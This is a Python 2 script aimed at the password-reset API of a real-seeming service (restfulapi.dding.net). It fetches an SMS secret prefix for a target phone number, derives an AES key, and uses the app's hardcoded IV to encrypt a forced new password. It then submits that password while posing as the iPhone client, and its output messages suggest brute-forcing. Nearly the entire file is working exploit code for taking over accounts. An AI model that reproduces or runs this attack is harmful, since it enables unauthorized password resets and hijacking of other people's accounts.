#!/usr/bin/env python
# coding=utf8
# author=joeyxy83@gmail.com
# create=20150319


import json
import random
import requests
import threadpool as tp
import sys
from Crypto.Cipher import AES
from Crypto import Random
from binascii import b2a_hex, a2b_hex

BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS) 
unpad = lambda s : s[0:-ord(s[-1])]

global phone


def _get_SecretPrefix(phone):
    data = {'UserName':phone,
    'VerifyMethod':'SMS',
    }
    headers = {'content-type':'application/x-www-form-urlencoded; charset=utf-8',
                    'User-Agent':'1.4.12 (iPhone; iPhone OS 7.1.4; zh_CN)',
        }
    api_url = 'http://restfulapi.dding.net/passwd1?'
    try:
        req = requests.post(api_url, data=data, headers=headers,timeout=3)
        req_status = json.loads(req.content)['ErrNo']
    except:
        req_status = 4003
    if req_status == 0:
        SecretPrefix = json.loads(req.content)['SecretPrefix']
        print "phone:%s SecretPrefix:%s" % (phone,SecretPrefix)
        return SecretPrefix

def _check(args):
    key = args
    print "check key:%s" % key
    decryptor = AESCipher(key)
    code = key[12:16]
    updatepassword=code+'123456' 
    newpassword=decryptor.encrypt(updatepassword)
    #print newpassword
    data = {'UserName':phone,
    'NewPassword':newpassword,
    }
    headers = {'content-type':'application/x-www-form-urlencoded; charset=utf-8',
                    'User-Agent':'1.4.12 (iPhone; iPhone OS 7.1.4; zh_CN)',
        }
    api_url = 'http://restfulapi.dding.net/passwd2?'
    try:
        req = requests.post(api_url, data=data, headers=headers,timeout=3)
        req_status = json.loads(req.content)['ErrNo']
    except:
        req_status = 4014
    if req_status == 0:
        print "phone:%s done at code:%s" % (phone,code)
        sys.exit(1)
    else:
        print '[-] Burp False phone:%s,code:%s,return error:%s,updatepassword:%s,hashcode:%s' % (phone,code,req_status,updatepassword,newpassword)




class AESCipher:
    def __init__( self, key ):
        """
        Requires hex encoded param as a key
        """
        #self.key = key.decode("hex")
        self.key = key
 
    def encrypt( self, raw ):
        """
        Returns hex encoded encrypted value!
        """
        raw = pad(raw)
        #print raw
        iv = 'dingding20140901'
        cipher = AES.new( self.key, AES.MODE_CBC, iv )
        return b2a_hex(cipher.encrypt( raw ) )
        #return ( iv + cipher.encrypt( raw ) ).encode("hex")
 
    def decrypt( self, enc ):
        """
        Requires hex encoded param to decrypt
        """
        enc = enc.decode("hex")
        iv = 'dingding20140901'
        #enc= enc[16:]
        cipher = AES.new(self.key, AES.MODE_CBC, iv )
        return unpad(cipher.decrypt( enc))


if __name__ == '__main__':
    args = []
    phone = sys.argv[1]
    prekey = _get_SecretPrefix(phone)
    code = raw_input("input the receive code")
    key = prekey+str(code)
    _check(key)